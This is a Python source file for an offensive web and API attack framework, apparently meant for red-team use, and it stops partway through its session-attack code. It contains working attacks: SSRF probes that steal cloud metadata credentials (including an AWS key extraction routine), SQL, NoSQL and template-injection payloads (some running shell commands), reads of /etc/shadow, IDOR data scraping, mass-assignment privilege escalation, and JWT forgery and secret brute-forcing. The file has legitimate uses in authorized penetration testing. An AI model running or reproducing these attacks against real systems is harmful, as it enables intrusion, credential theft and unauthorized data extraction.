#!/usr/bin/env python3
"""
Sentinel Framework
===========================
Author      : arkanzasfeziii
License     : MIT
Version     : 1.0.0
Description : Offensive web & API attack framework for authorized red team engagements.
              Covers full API kill chain: fingerprinting, SSRF exploitation (→cloud creds),
              IDOR enumeration & data extraction, auth bypass (JWT/OAuth/session),
              injection exploitation (SQL/NoSQL/SSTI), and GraphQL attack chains.

              Aligned with MITRE ATT&CK:
                T1190 Exploit Public-Facing Application | T1552 Unsecured Credentials
                T1556 Auth Bypass | T1213 Data from Info Repositories

WARNING: For AUTHORIZED penetration testing and red team engagements ONLY.
Unauthorized use is ILLEGAL. Obtain written authorization before use.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import html
import itertools
import json
import os
import random
import re
import string
import sys
import textwrap
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, Generator, Iterator, List, Optional, Tuple

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    REQUESTS = True
except ImportError:
    REQUESTS = False

try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn
    RICH = True
except ImportError:
    RICH = False

try:
    import pyfiglet
    PYFIGLET = True
except ImportError:
    PYFIGLET = False


# ── Constants ──────────────────────────────────────────────────────────────────

TOOL_NAME = "Sentinel Framework"
VERSION   = "1.0.0"
AUTHOR    = "arkanzasfeziii"
COMMAND   = "sentinel"

LEGAL_WARNING = """
╔══════════════════════════════════════════════════════════════════════════════╗
║         ⚠   SHADOWAPI — AUTHORIZED RED TEAM USE ONLY   ⚠                   ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  This framework executes REAL web/API attacks: SSRF exploitation, IDOR      ║
║  data extraction, authentication bypass, injection exploitation, and         ║
║  GraphQL abuse. Attacks may access or modify application data.               ║
║                                                                              ║
║  Requirements before use:                                                   ║
║    ✓ Written authorization from the target organization                     ║
║    ✓ Defined scope (URL/domain list)                                        ║
║    ✓ Rules of engagement signed off                                         ║
║                                                                              ║
║  The author (arkanzasfeziii) accepts NO LIABILITY for misuse.               ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

DEFAULT_UA      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
DEFAULT_TIMEOUT = 10
MAX_THREADS     = 10

# SSRF probe targets (cloud metadata endpoints)
SSRF_PROBES: Dict[str, List[Dict[str, Any]]] = {
    "aws_imds_v1": [
        {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "indicator": ["meta-data", "iam"], "critical": True},
        {"url": "http://169.254.169.254/latest/meta-data/",
         "indicator": ["ami-id", "hostname"], "critical": False},
        {"url": "http://169.254.169.254/latest/user-data",
         "indicator": [], "critical": True},
    ],
    "aws_imds_v2": [
        {"url": "http://169.254.169.254/latest/api/token",
         "method": "PUT", "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
         "indicator": [], "critical": True},
    ],
    "azure_imds": [
        {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         "headers": {"Metadata": "true"}, "indicator": ["subscriptionId","resourceGroupName"], "critical": True},
        {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
         "headers": {"Metadata": "true"}, "indicator": ["access_token"], "critical": True},
    ],
    "gcp_metadata": [
        {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
         "headers": {"Metadata-Flavor": "Google"}, "indicator": ["access_token"], "critical": True},
        {"url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
         "headers": {"Metadata-Flavor": "Google"}, "indicator": [], "critical": False},
    ],
    "kubernetes": [
        {"url": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
         "headers": {"Authorization": "Bearer "}, "indicator": ["items","apiVersion"], "critical": True},
    ],
    "internal_common": [
        {"url": "http://localhost/", "indicator": [], "critical": False},
        {"url": "http://127.0.0.1/", "indicator": [], "critical": False},
        {"url": "http://0.0.0.0/", "indicator": [], "critical": False},
        {"url": "http://[::1]/", "indicator": [], "critical": False},
        {"url": "http://10.0.0.1/", "indicator": [], "critical": False},
        {"url": "http://192.168.1.1/", "indicator": [], "critical": False},
        {"url": "file:///etc/passwd", "indicator": ["root:x:0"], "critical": True},
        {"url": "file:///etc/shadow", "indicator": ["root:"], "critical": True},
        {"url": "file:///proc/self/environ", "indicator": ["HOME=","PATH="], "critical": True},
        {"url": "dict://localhost:6379/INFO", "indicator": ["redis_version"], "critical": True},
        {"url": "gopher://localhost:25/_EHLO", "indicator": ["ESMTP"], "critical": False},
    ],
}

SSRF_BYPASS_ENCODINGS: List[Callable[[str], str]] = [
    lambda u: u,
    lambda u: u.replace("169.254.169.254", "169.254.169.254.xip.io"),
    lambda u: u.replace("169.254.169.254", "0251.0376.0251.0376"),
    lambda u: u.replace("169.254.169.254", "0xa9fea9fe"),
    lambda u: u.replace("169.254.169.254", "2852039166"),
    lambda u: u.replace("169.254.169.254", "[::ffff:169.254.169.254]"),
    lambda u: u.replace("http://", "http://foo@").replace("169.254.169.254", "169.254.169.254"),
    lambda u: u.replace("http://", "hTTp://"),
    lambda u: u.replace("http://", "http:///"),
]

SQLI_PAYLOADS_BASIC = [
    "'", '"', "' OR '1'='1", "' OR '1'='1'--", '" OR "1"="1',
    "1 OR 1=1", "1; DROP TABLE users--", "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "admin'--", "admin' #", "' OR 1=1--", "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--", "1 AND SLEEP(5)--", "'; SELECT pg_sleep(5)--",
]

SQLI_PAYLOADS_BLIND = [
    ("' AND SLEEP(5)--",          "mysql",      5.0),
    ("'; WAITFOR DELAY '0:0:5'--","mssql",      5.0),
    ("'; SELECT pg_sleep(5)--",   "postgres",   5.0),
    ("' AND 1=1--",               "generic",    0.0),
    ("' AND 1=2--",               "generic",    0.0),
]

NOSQL_PAYLOADS = [
    '{"$gt": ""}', '{"$ne": null}', '{"$exists": true}',
    '{"$regex": ".*"}', '{"$where": "1==1"}',
    '[$ne]=1', '[$gt]=', '[$regex]=.*',
    "' || '1'=='1", "'; return true; var x='",
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{config}}", "Config"),
    ("{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}", "uid="),
    ("{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}", "uid="),
    ("%{(#a=@org.apache.struts2.ServletActionContext@getResponse()).(#a.setHeader('X-SSTI','true'))}", "X-SSTI"),
]

JWT_NONE_ALGOS = ["none", "None", "NONE", "nOnE"]

COMMON_JWT_SECRETS = [
    "secret", "password", "123456", "jwt_secret", "your-256-bit-secret",
    "supersecret", "mysecret", "changeme", "s3cr3t", "jwt-secret",
    "app_secret", "private_key", "secretkey", "jwttoken", "accesstoken",
]

GRAPHQL_INTROSPECTION = """
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
  }
}
"""

GRAPHQL_INTROSPECTION_BYPASS = [
    "__schema{types{name,fields{name}}}",
    "{__typename}",
    "{ __type(name: \"Query\") { fields { name } } }",
]

WAF_SIGNATURES: Dict[str, List[str]] = {
    "Cloudflare":    ["cloudflare", "cf-ray", "__cfduid"],
    "AWS WAF":       ["x-amzn-requestid", "x-amzn-trace-id"],
    "Akamai":        ["akamai", "akamaierror"],
    "F5 BIG-IP":     ["bigipserver", "f5-csp"],
    "Incapsula":     ["incap_ses", "visid_incap"],
    "ModSecurity":   ["mod_security", "modsecurity"],
    "Sucuri":        ["sucuri-clientside"],
    "Barracuda":     ["barra_counter_session"],
    "DenyAll":       ["sessioncookie"],
}

COMMON_API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/graphql", "/graphiql", "/playground",
    "/swagger", "/swagger.json", "/swagger.yaml",
    "/openapi.json", "/openapi.yaml", "/api-docs",
    "/.well-known/openid-configuration",
    "/actuator", "/actuator/health", "/actuator/env", "/actuator/beans",
    "/metrics", "/health", "/status", "/ping",
    "/admin", "/admin/api", "/internal", "/debug",
    "/v1", "/v2", "/v3", "/rest", "/rpc",
]

OAUTH_ENDPOINTS = [
    "/.well-known/openid-configuration",
    "/oauth/token", "/oauth2/token", "/auth/token",
    "/connect/token", "/realms/master/protocol/openid-connect/token",
]


# ── Dataclasses ────────────────────────────────────────────────────────────────

@dataclass
class AttackResult:
    module:   str
    attack:   str
    status:   str  # "VULN", "NOT_VULN", "ERROR", "PARTIAL"
    url:      str  = ""
    payload:  str  = ""
    evidence: str  = ""
    data:     Any  = None
    severity: str  = "INFO"  # CRITICAL/HIGH/MEDIUM/LOW/INFO
    notes:    str  = ""

@dataclass
class SSRFHit:
    url:        str
    ssrf_param: str
    ssrf_url:   str
    response:   str
    cloud:      str
    critical:   bool

@dataclass
class Credential:
    type:   str
    value:  Dict[str, str]
    source: str
    notes:  str = ""

@dataclass
class EngagementSession:
    base_url:    str
    headers:     Dict[str, str]
    cookies:     Dict[str, str]
    proxies:     Dict[str, str]
    timeout:     int
    delay:       float
    results:     List[AttackResult]  = field(default_factory=list)
    credentials: List[Credential]   = field(default_factory=list)
    loot:        Dict[str, Any]      = field(default_factory=dict)
    session:     Any                 = None

    def __post_init__(self) -> None:
        if REQUESTS:
            self.session = requests.Session()
            self.session.headers.update(self.headers)
            self.session.cookies.update(self.cookies)
            if self.proxies:
                self.session.proxies.update(self.proxies)
            retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[500,502,503])
            adapter = HTTPAdapter(max_retries=retry)
            self.session.mount("http://", adapter)
            self.session.mount("https://", adapter)


# ── Helpers ────────────────────────────────────────────────────────────────────

def _log(msg: str, level: str = "INFO") -> None:
    colors = {"INFO":"\033[36m","OK":"\033[32m","WARN":"\033[33m",
              "ERR":"\033[31m","CRIT":"\033[35m","VULN":"\033[35m"}
    reset = "\033[0m"
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"{colors.get(level,'')}{ts} [{level}] {msg}{reset}")

def _req(es: EngagementSession, method: str, url: str,
         **kwargs: Any) -> Optional[Any]:
    if not REQUESTS:
        return None
    try:
        time.sleep(es.delay)
        resp = es.session.request(method, url, timeout=es.timeout,
                                  allow_redirects=False, **kwargs)
        return resp
    except Exception:
        return None

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def _b64url_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + "=" * pad)

def _jwt_parts(token: str) -> Optional[Tuple[Dict, Dict, str]]:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None

def _forge_jwt_none(original: str) -> List[str]:
    parsed = _jwt_parts(original)
    if not parsed:
        return []
    header, payload, _ = parsed
    forged_tokens = []
    for alg in JWT_NONE_ALGOS:
        header_mod = {**header, "alg": alg}
        h = _b64url_encode(json.dumps(header_mod, separators=(",",":")).encode())
        p = _b64url_encode(json.dumps(payload, separators=(",",":")).encode())
        forged_tokens.append(f"{h}.{p}.")
    return forged_tokens

def _forge_jwt_hs256(original: str, secret: str) -> str:
    try:
        import hmac as _hmac
        parts = _jwt_parts(original)
        if not parts:
            return original
        header, payload, _ = parts
        header["alg"] = "HS256"
        h = _b64url_encode(json.dumps(header, separators=(",",":")).encode())
        p = _b64url_encode(json.dumps(payload, separators=(",",":")).encode())
        sig = _hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
        return f"{h}.{p}.{_b64url_encode(sig)}"
    except Exception:
        return original

def _idor_id_generator(base_id: Any, count: int = 50) -> Iterator[Any]:
    try:
        n = int(base_id)
        for i in range(max(1, n - count // 2), n + count // 2 + 1):
            if i != n:
                yield i
    except (ValueError, TypeError):
        pass
    # UUID guessing — yield sequential-looking UUIDs
    import uuid as _uuid
    for _ in range(10):
        yield str(_uuid.uuid4())


# ── Module 1: Fingerprint ──────────────────────────────────────────────────────

class FingerprintModule:
    """Detect tech stack, WAF, API framework, discover hidden endpoints."""

    def run(self, es: EngagementSession) -> List[AttackResult]:
        results: List[AttackResult] = []
        _log(f"[Fingerprint] Target: {es.base_url}", "INFO")

        # 1. Base response analysis
        resp = _req(es, "GET", es.base_url)
        if not resp:
            results.append(AttackResult("fingerprint", "base_request", "ERROR",
                                        url=es.base_url, evidence="No response"))
            return results

        server = resp.headers.get("Server", "")
        powered = resp.headers.get("X-Powered-By", "")
        tech: List[str] = []

        if server:      tech.append(f"Server: {server}")
        if powered:     tech.append(f"X-Powered-By: {powered}")
        if "laravel" in resp.text.lower(): tech.append("Laravel (PHP)")
        if "django"  in resp.text.lower(): tech.append("Django (Python)")
        if "rails"   in resp.text.lower(): tech.append("Ruby on Rails")
        if "express" in resp.text.lower(): tech.append("Express.js (Node)")
        if "spring"  in resp.text.lower(): tech.append("Spring (Java)")
        if "wordpress" in resp.text.lower(): tech.append("WordPress")
        if "wp-content" in resp.text: tech.append("WordPress")
        if "struts"  in resp.text.lower(): tech.append("Apache Struts")

        _log(f"[Fingerprint] Tech stack: {', '.join(tech) or 'Unknown'}", "OK")

        # 2. WAF detection
        waf_detected = []
        all_headers_str = " ".join(f"{k}={v}" for k,v in resp.headers.items()).lower()
        for waf, sigs in WAF_SIGNATURES.items():
            if any(sig.lower() in all_headers_str for sig in sigs):
                waf_detected.append(waf)
        # Probe WAF with known-bad payload
        probe_resp = _req(es, "GET", es.base_url, params={"q": "' OR 1=1--"})
        if probe_resp and probe_resp.status_code in (403, 406, 429, 503):
            waf_detected.append("WAF-blocked (403/406/429/503 on SQL probe)")

        # 3. API endpoint discovery
        found_endpoints: List[Dict[str, Any]] = []
        for path in COMMON_API_PATHS:
            url = es.base_url.rstrip("/") + path
            r = _req(es, "GET", url)
            if r and r.status_code not in (404, 410):
                content_type = r.headers.get("Content-Type", "")
                found_endpoints.append({
                    "path": path, "status": r.status_code,
                    "size": len(r.content),
                    "content_type": content_type,
                    "notes": "JSON" if "json" in content_type else ("GraphQL" if "graphql" in path else ""),
                })
                _log(f"[Fingerprint] Found: {path} [{r.status_code}]", "OK" if r.status_code < 400 else "WARN")

        # 4. GraphQL detection
        graphql_url = ""
        for ep in found_endpoints:
            if "graphql" in ep["path"].lower():
                graphql_url = es.base_url.rstrip("/") + ep["path"]
                break

        # 5. CORS misconfiguration
        cors_vulns = []
        cors_r = _req(es, "GET", es.base_url, headers={"Origin": "https://evil.attacker.com"})
        if cors_r:
            acao = cors_r.headers.get("Access-Control-Allow-Origin", "")
            acac = cors_r.headers.get("Access-Control-Allow-Credentials", "")
            if "evil.attacker.com" in acao or acao == "*":
                cors_vulns.append({"header": "ACAO", "value": acao, "credentials": acac})
                if acac.lower() == "true":
                    _log("[Fingerprint] CRITICAL CORS: reflects origin + allows credentials!", "CRIT")

        # 6. Security headers check
        missing_headers = []
        security_headers = [
            "Content-Security-Policy", "Strict-Transport-Security",
            "X-Frame-Options", "X-Content-Type-Options",
        ]
        for h in security_headers:
            if h not in resp.headers:
                missing_headers.append(h)

        loot = {
            "base_url": es.base_url,
            "status_code": resp.status_code,
            "tech_stack": tech,
            "waf": waf_detected,
            "endpoints": found_endpoints,
            "graphql_url": graphql_url,
            "cors_vulns": cors_vulns,
            "missing_security_headers": missing_headers,
        }
        es.loot["fingerprint"] = loot

        results.append(AttackResult(
            "fingerprint", "discovery", "VULN" if cors_vulns else "PARTIAL",
            url=es.base_url,
            evidence=f"Tech: {tech[:2]} | WAF: {waf_detected} | Endpoints: {len(found_endpoints)}",
            data=loot, severity="HIGH" if cors_vulns else "INFO",
            notes=f"CORS vuln: {bool(cors_vulns)} | {len(found_endpoints)} endpoints discovered"
        ))
        return results


# ── Module 2: SSRF Exploitation ───────────────────────────────────────────────

class SSRFModule:
    """Find SSRF parameters and exploit them to extract cloud credentials."""

    def run(self, es: EngagementSession,
            param_names: Optional[List[str]] = None,
            target_url: str = "") -> List[AttackResult]:
        results: List[AttackResult] = []
        if not REQUESTS:
            return results

        scan_url = target_url or es.base_url
        probe_params = param_names or [
            "url", "uri", "src", "source", "redirect", "target", "dest",
            "destination", "next", "callback", "return", "returnUrl", "returnURL",
            "redirect_uri", "redirect_url", "ref", "referrer", "site",
            "endpoint", "fetch", "path", "host", "domain", "resource",
            "link", "image", "img", "logo", "icon", "file", "page",
            "data", "proxy", "forward", "api", "webhook", "notify",
        ]

        hits: List[SSRFHit] = []

        # Test each param with each cloud metadata probe
        for param in probe_params:
            for cloud_name, probes in SSRF_PROBES.items():
                for probe in probes:
                    ssrf_url = probe["url"]
                    extra_hdrs = probe.get("headers", {})
                    method = probe.get("method", "GET")

                    # Try direct injection first
                    for encoding_fn in SSRF_BYPASS_ENCODINGS[:3]:  # limit bypass attempts
                        encoded_url = encoding_fn(ssrf_url)
                        test_params = {param: encoded_url}
                        resp = _req(es, method, scan_url, params=test_params,
                                   headers={**dict(es.headers), **extra_hdrs})
                        if resp is None:
                            continue

                        body = resp.text[:2000]
                        indicators = probe.get("indicator", [])

                        # Check response for SSRF evidence
                        is_hit = False
                        if indicators and any(ind.lower() in body.lower() for ind in indicators):
                            is_hit = True
                        elif "access_key" in body.lower() or "secretaccesskey" in body.lower():
                            is_hit = True
                        elif "access_token" in body.lower() and cloud_name in ("azure_imds", "gcp_metadata"):
                            is_hit = True
                        elif "root:x:0" in body and "file:///" in ssrf_url:
                            is_hit = True

                        if is_hit:
                            hit = SSRFHit(
                                url=scan_url, ssrf_param=param, ssrf_url=encoded_url,
                                response=body, cloud=cloud_name, critical=probe.get("critical", False),
                            )
                            hits.append(hit)
                            sev = "CRITICAL" if probe.get("critical") else "HIGH"
                            _log(f"[SSRF] HIT! param={param} url={ssrf_url[:60]} cloud={cloud_name}", "CRIT")

                            # If we hit IMDS, try to extract credentials immediately
                            if cloud_name == "aws_imds_v1" and "security-credentials" in ssrf_url:
                                creds = self._extract_aws_creds(es, scan_url, param, body)
                                if creds:
                                    es.credentials.extend(creds)

                            results.append(AttackResult(
                                "ssrf", f"hit_{cloud_name}",
                                "VULN", url=scan_url, payload=f"{param}={encoded_url}",
                                evidence=body[:300], data={"cloud": cloud_name, "param": param,
                                                           "ssrf_url": encoded_url},
                                severity=sev,
                                notes=f"SSRF via param '{param}' targeting {cloud_name}"
                            ))
                            break  # Stop trying bypass encodings for this probe

        # POST body SSRF testing
        for param in probe_params[:10]:
            for cloud_name, probes in SSRF_PROBES.items():
                probe = probes[0]
                ssrf_url = probe["url"]
                for content_type, payload_fn in [
                    ("application/json",            lambda p, u: json.dumps({p: u})),
                    ("application/x-www-form-urlencoded", lambda p, u: f"{p}={urllib.parse.quote(u)}"),
                    ("text/xml",                    lambda p, u: f"<request><{p}>{u}</{p}></request>"),
                ]:
                    resp = _req(es, "POST", scan_url,
                                data=payload_fn(param, ssrf_url),
                                headers={**dict(es.headers), "Content-Type": content_type})
                    if resp and resp.text and any(
                        ind.lower() in resp.text.lower() for ind in probe.get("indicator", [])
                    ):
                        _log(f"[SSRF] POST SSRF hit! param={param} ct={content_type}", "CRIT")
                        results.append(AttackResult(
                            "ssrf", "post_ssrf", "VULN",
                            url=scan_url,
                            payload=f"POST {param}={ssrf_url} ({content_type})",
                            evidence=resp.text[:300],
                            severity="CRITICAL",
                            notes=f"POST-body SSRF via {param} with {content_type}",
                        ))

        if not hits and not results:
            results.append(AttackResult("ssrf", "scan", "NOT_VULN",
                                        url=scan_url,
                                        notes=f"Tested {len(probe_params)} params × {sum(len(v) for v in SSRF_PROBES.values())} probes — no SSRF found"))
        es.loot["ssrf"] = [{"param": h.ssrf_param, "url": h.ssrf_url, "cloud": h.cloud} for h in hits]
        return results

    def _extract_aws_creds(self, es: EngagementSession, scan_url: str,
                            param: str, role_list_body: str) -> List[Credential]:
        creds = []
        role_name = role_list_body.strip().split("\n")[0].strip()
        if not role_name:
            return creds
        cred_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
        resp = _req(es, "GET", scan_url, params={param: cred_url})
        if resp:
            try:
                data = resp.json()
                if "AccessKeyId" in data:
                    creds.append(Credential(
                        type="aws_instance_role",
                        value={"AccessKeyId": data["AccessKeyId"],
                               "SecretAccessKey": data.get("SecretAccessKey",""),
                               "Token": data.get("Token",""),
                               "Expiration": data.get("Expiration","")},
                        source=f"SSRF:IMDS:{param}",
                        notes=f"EC2 role credentials via SSRF param '{param}'",
                    ))
                    _log(f"[SSRF] AWS creds extracted! KeyId={data['AccessKeyId'][:16]}...", "CRIT")
            except Exception:
                pass
        return creds


# ── Module 3: IDOR Exploitation ───────────────────────────────────────────────

class IDORModule:
    """Enumerate object IDs and extract unauthorized data through IDOR vulnerabilities."""

    def run(self, es: EngagementSession, target_url: str,
            target_id: Any, id_param: str = "",
            auth_headers_victim: Optional[Dict[str, str]] = None) -> List[AttackResult]:
        results: List[AttackResult] = []
        scan_url = target_url or es.base_url
        extracted_objects: List[Dict[str, Any]] = []

        _log(f"[IDOR] Enumerating around ID {target_id} at {scan_url}", "INFO")

        # 1. Direct path-based IDOR (e.g., /api/users/123 → /api/users/124)
        if "{id}" in scan_url or str(target_id) in scan_url:
            base_url_pattern = scan_url.replace(str(target_id), "{id}")

            # Get reference response (legitimate)
            ref_url = base_url_pattern.replace("{id}", str(target_id))
            ref_resp = _req(es, "GET", ref_url,
                           headers=auth_headers_victim if auth_headers_victim else {})
            ref_body = ref_resp.text[:500] if ref_resp else ""

            # Enumerate adjacent IDs
            success_count = 0
            for alt_id in _idor_id_generator(target_id, count=40):
                test_url = base_url_pattern.replace("{id}", str(alt_id))
                resp = _req(es, "GET", test_url)
                if resp and resp.status_code == 200 and len(resp.text) > 10:
                    body = resp.text[:500]
                    # Check it's different from reference (different object)
                    if body != ref_body:
                        try:
                            data = resp.json()
                        except Exception:
                            data = {"raw": body[:200]}
                        extracted_objects.append({"id": alt_id, "url": test_url, "data": data})
                        success_count += 1
                        if success_count <= 3:
                            _log(f"[IDOR] Extracted object {alt_id}: {str(data)[:80]}", "CRIT")

        # 2. Param-based IDOR (e.g., /api/profile?user_id=123)
        if id_param:
            ref_resp = _req(es, "GET", scan_url, params={id_param: target_id})
            ref_body = ref_resp.text[:500] if ref_resp else ""

            for alt_id in _idor_id_generator(target_id, count=30):
                resp = _req(es, "GET", scan_url, params={id_param: alt_id})
                if resp and resp.status_code == 200 and resp.text[:500] != ref_body and len(resp.text) > 10:
                    try:
                        data = resp.json()
                    except Exception:
                        data = {"raw": resp.text[:200]}
                    extracted_objects.append({"id": alt_id, "param": id_param, "data": data})
                    _log(f"[IDOR] Param IDOR hit: {id_param}={alt_id}", "CRIT")

        # 3. Horizontal → Vertical IDOR escalation
        # Try accessing admin/privileged endpoints with low-priv auth
        admin_paths = [
            scan_url.replace("/user/", "/admin/"),
            scan_url.replace("/profile/", "/admin/profile/"),
            scan_url.replace("/v1/me", "/v1/admin"),
            scan_url.replace("/api/user", "/api/admin"),
        ]
        for admin_url in admin_paths:
            if admin_url == scan_url:
                continue
            resp = _req(es, "GET", admin_url)
            if resp and resp.status_code == 200:
                _log(f"[IDOR] Vertical escalation! Admin endpoint accessible: {admin_url}", "CRIT")
                extracted_objects.append({"url": admin_url, "type": "vertical_escalation",
                                          "data": resp.text[:200]})
                results.append(AttackResult(
                    "idor", "vertical_escalation", "VULN",
                    url=admin_url, evidence=resp.text[:200],
                    severity="CRITICAL",
                    notes=f"Admin endpoint accessible without admin privileges: {admin_url}",
                ))

        # 4. Mass assignment / object manipulation
        post_mass = [
            ("role", "admin"), ("is_admin", True), ("permissions", ["admin"]),
            ("user_type", "administrator"), ("access_level", 9),
        ]
        for key, val in post_mass:
            resp = _req(es, "PUT", scan_url,
                        json={id_param or "id": target_id, key: val})
            if resp and resp.status_code in (200, 201, 204):
                _log(f"[IDOR] Mass assignment: {key}={val} accepted!", "CRIT")
                results.append(AttackResult(
                    "idor", "mass_assignment", "VULN",
                    url=scan_url, payload=f"{key}={val}",
                    evidence=resp.text[:200], severity="HIGH",
                    notes=f"Server accepted unauthorized {key}={val} via PUT",
                ))

        if extracted_objects:
            es.loot["idor"] = extracted_objects
            results.insert(0, AttackResult(
                "idor", "object_enumeration", "VULN",
                url=scan_url,
                evidence=f"Extracted {len(extracted_objects)} unauthorized objects",
                data=extracted_objects[:5],
                severity="HIGH",
                notes=f"IDOR: {len(extracted_objects)} unauthorized objects retrieved",
            ))
        elif not results:
            results.append(AttackResult("idor", "scan", "NOT_VULN",
                                        url=scan_url, notes="No IDOR vulnerability found"))
        return results


# ── Module 4: Auth Attacks ────────────────────────────────────────────────────

class AuthModule:
    """JWT attacks, OAuth token theft, session manipulation, API key enumeration."""

    def run(self, es: EngagementSession, jwt_token: str = "",
            oauth_client_id: str = "", oauth_redirect: str = "") -> List[AttackResult]:
        results: List[AttackResult] = []
        if jwt_token:
            results.extend(self._jwt_attacks(es, jwt_token))
        results.extend(self._session_attacks(es))
        results.extend(self._oauth_attacks(es, oauth_client_id, oauth_redirect))
        results.extend(self._apikey_spray(es))
        return results

    def _jwt_attacks(self, es: EngagementSession, token: str) -> List[AttackResult]:
        results: List[AttackResult] = []
        parsed = _jwt_parts(token)
        if not parsed:
            return [AttackResult("auth", "jwt_parse", "ERROR", notes="Invalid JWT format")]

        header, payload, _ = parsed
        _log(f"[Auth/JWT] Analyzing token. alg={header.get('alg')} claims={list(payload.keys())}", "INFO")

        # 1. Algorithm None attack
        none_tokens = _forge_jwt_none(token)
        test_url = es.base_url.rstrip("/") + "/api/me"  # common endpoint
        for none_tok in none_tokens:
            resp = _req(es, "GET", test_url,
                        headers={**dict(es.headers), "Authorization": f"Bearer {none_tok}"})
            if resp and resp.status_code == 200:
                _log(f"[Auth/JWT] NONE ALGORITHM ACCEPTED! alg=none bypass works!", "CRIT")
                results.append(AttackResult(
                    "auth", "jwt_alg_none", "VULN",
                    url=test_url, payload=none_tok[:80],
                    evidence=resp.text[:200], severity="CRITICAL",
                    notes="JWT accepts alg:none — signature verification completely disabled",
                ))
                break

        # 2. Weak secret brute force (HS256)
        if header.get("alg") in ("HS256", "HS384", "HS512"):
            _log(f"[Auth/JWT] Brute-forcing HS256 secret...", "INFO")
            found_secret = None
            for secret in COMMON_JWT_SECRETS:
                try:
                    header_b64 = token.split(".")[0]
                    payload_b64 = token.split(".")[1]
                    sig_expected = _b64url_decode(token.split(".")[2])
                    computed = hmac.new(
                        secret.encode(),
                        f"{header_b64}.{payload_b64}".encode(),
                        hashlib.sha256
                    ).digest()
                    if hmac.compare_digest(computed, sig_expected):
                        found_secret = secret
                        break
                except Exception:
                    continue
            if found_secret:
                _log(f"[Auth/JWT] WEAK SECRET FOUND: '{found_secret}'", "CRIT")
                # Forge admin token
                admin_payload = {**payload, "role": "admin", "is_admin": True,
                                 "user_type": "administrator", "sub": "1"}
                forged = _forge_jwt_hs256(token, found_secret)
                results.append(AttackResult(
                    "auth", "jwt_weak_secret", "VULN",
                    payload=found_secret, evidence=f"Admin token: {forged[:80]}...",
                    severity="CRITICAL",
                    notes=f"JWT signed with weak secret '{found_secret}'. Forge any token.",
                ))
                es.credentials.append(Credential(
                    type="jwt_forged", value={"token": forged, "secret": found_secret},
                    source="jwt_brute_force", notes=f"Forged admin JWT with secret '{found_secret}'",
                ))

        # 3. Algorithm confusion (RS256 → HS256)
        if header.get("alg") == "RS256":
            _log("[Auth/JWT] RS256 detected — attempting alg confusion attack", "INFO")
            # In a real scenario, we'd fetch the public key and re-sign as HS256
            results.append(AttackResult(
                "auth", "jwt_alg_confusion", "PARTIAL",
                evidence="RS256 detected. Fetch public key from /well-known/jwks.json or /oauth/certs then re-sign as HS256.",
                severity="HIGH",
                notes="Algorithm confusion possible if server accepts HS256 signed with RSA public key",
            ))

        # 4. Sensitive data in claims
        sensitive_claim_patterns = ["password","secret","key","token","cred","ssn","credit","dob"]
        sensitive = {k: v for k, v in payload.items()
                     if any(p in k.lower() for p in sensitive_claim_patterns)}
        if sensitive:
            results.append(AttackResult(
                "auth", "jwt_sensitive_claims", "VULN",
                evidence=str(sensitive), severity="HIGH",
                notes=f"Sensitive data found in JWT payload: {list(sensitive.keys())}",
            ))

        return results

    def _session_attacks(self, es: EngagementSession) -> List[AttackResult]:
        results: List[AttackResult] = []

        # 1. Session fixation
        pre_resp = _req(es, "GET", es.base_url)
        if pre_resp:
            session_cookies = {k: v for k, v in pre_resp.cookies.items()
                               if any(s in k.lower() for s in ["session","sess","sid","auth","token"])}
            if session_cookies:
                # Try fixing a session ID before login
                fixed_session = "CLOUDREAPER_FIXED_" + _random_str(16)
                fixed_cookies = {list(session_cookies.keys())[0]: fixed_session}
                resp2 = _req(es, "GET", es.base_url, cookies=fixed_cookies)
                if resp2 and fixed_session in resp2.cookies.values():
                    results.append(AttackResult(
                        "auth", "session_fixation", "VULN",
                        evidence=f"Server accepted fixed session ID: {fixed_session}",
                        severity="HIGH", notes="Session fixation vulnerability detected",
                    ))

        # 2. CSRF token bypass
        csrf_resp = _req(es, "GET", es.base_url)
        if csrf_resp:
            csrf_match = re.search(r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)', csrf_resp.text, re.I)
            if csrf_match:
                # Test without CSRF token
